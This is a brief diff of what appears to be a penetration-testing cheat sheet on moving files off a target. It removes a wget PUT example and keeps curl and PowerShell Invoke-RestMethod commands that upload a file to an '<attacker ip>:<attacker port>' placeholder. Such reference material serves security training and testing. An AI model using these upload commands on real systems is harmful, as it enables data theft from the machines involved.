@@ -67,9 +67,5 @@ curl --upload-file test.txt http://<attacker ip>:<attacker port>/
 ```
 
 ```powershell
-wget --method=PUT --post-file=test.txt http://<attacker ip>:<attacker port>/
-```
-
-```powershell
 Invoke-RestMethod -Uri http://<attacker ip>:<attacker port>/<remote file name> -Method PUT -InFile <target file>
 ```
